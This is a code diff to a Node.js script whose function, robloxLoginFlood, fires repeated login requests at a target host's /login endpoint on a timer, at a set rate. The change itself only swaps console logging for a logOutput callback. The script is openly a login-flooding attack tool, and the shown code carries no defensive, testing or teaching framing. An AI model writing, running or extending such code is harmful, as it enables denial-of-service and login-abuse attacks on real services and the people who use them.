@@ -1,6 +1,6 @@
 const request = require('request');
 
-function robloxLoginFlood(target, rateLimit) {
+function robloxLoginFlood(target, rateLimit, logOutput) {
     setInterval(() => {
         const options = {
             url: `https://${target}/login`,
@@ -13,9 +13,9 @@ function robloxLoginFlood(target, rateLimit) {
 
         request(options, (error, response, body) => {
             if (error) {
-                console.error('Error: ' + error.message);
+                logOutput('Error: ' + error.message);
             } else {
-                console.log('Sent Roblox login request');
+                logOutput('Sent Roblox login request');
             }
         });
     }, 1000 / rateLimit);
